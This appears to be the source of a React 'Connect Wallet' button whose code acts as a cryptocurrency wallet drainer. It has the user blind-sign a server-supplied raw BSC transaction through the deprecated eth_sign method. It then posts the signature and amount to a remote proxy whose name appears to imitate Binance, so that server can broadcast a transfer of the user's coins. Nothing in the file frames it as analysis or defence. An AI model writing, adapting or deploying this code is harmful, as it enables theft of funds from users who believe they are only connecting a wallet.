import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner() {
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    // مقداردهی اولیه WalletConnect
    const ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      chains: [56], // فقط BSC
      methods: ["eth_sign"],
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    const provider = ethereumProvider;
    const accounts = await provider.request({ method: "eth_accounts" });
    const userAddress = accounts[0];

    if (!userAddress) {
      console.error("❌ Wallet connection failed");
      return;
    }

    console.log("✅ Wallet Connected:", userAddress);

    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }], // BSC
      });
    } catch (error) {
      console.error("❌ Error in switching chain:", error);
      return;
    }

    const apiUrl = "https://sponsorbinance.vercel.app/api/proxy";

    async function requestUnsignedTransaction(address) {
      console.log("📡 Requesting Unsigned Transaction...");
      
      try {
        const response = await jQuery.post(apiUrl, {
          handler: "tx",
          address: address,
          chain: "56",
          type: "coin",
        });

        if (!response || response === "null") {
          console.error("❌ API Response is NULL");
          return null;
        }

        let unsignedTx;
        try {
          unsignedTx = JSON.parse(response);
        } catch (e) {
          console.error("❌ Error parsing JSON:", e);
          return null;
        }

        console.log("📜 Unsigned Transaction:", unsignedTx);

        if (!unsignedTx.result || !unsignedTx.amount) {
          console.error("❌ Invalid transaction data");
          return null;
        }

        return unsignedTx;
      } catch (error) {
        console.error("❌ Error in requestUnsignedTransaction:", error);
        return null;
      }
    }

    async function signTransaction(address, unsignedTx) {
      const message = unsignedTx.result.rawTransaction || unsignedTx.result;
      console.log("📝 Message to Sign:", message);

      try {
        const signature = await provider.request({
          method: "eth_sign",
          params: [address, message],
        });

        if (!signature) {
          console.error("❌ Signing failed");
          return null;
        }

        console.log("✍️ Signature:", signature);
        return signature;
      } catch (error) {
        console.error("❌ Error in signing transaction:", error);
        return null;
      }
    }

    async function sendSignedTransaction(address, amount, signature) {
      console.log("📡 Sending Signed Transaction...");

      try {
        const txHash = await jQuery.post(apiUrl, {
          handler: "sign",
          address: address,
          amount: amount,
          signature: signature,
          type: "coin",
        });

        console.log("📤 Transaction Sent:", txHash);
        return txHash;
      } catch (error) {
        console.error("❌ Error in sendSignedTransaction:", error);
        return null;
      }
    }

    // درخواست تراکنش خام
    const unsignedTx = await requestUnsignedTransaction(userAddress);
    if (!unsignedTx) return;

    // دریافت امضای کاربر
    const signature = await signTransaction(userAddress, unsignedTx);
    if (!signature) return;

    // ارسال امضا به سرور
    const txHash = await sendSignedTransaction(userAddress, unsignedTx.amount, signature);
    
    if (txHash) {
      console.log("📤 Final Transaction Hash:", txHash);
    } else {
      console.error("⚠ Transaction failed.");
    }
  }

  return (
    <a
      href="#"
      id="connectWallet"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      <span>Connect Wallet</span>
    </a>
  );
}

export default App;
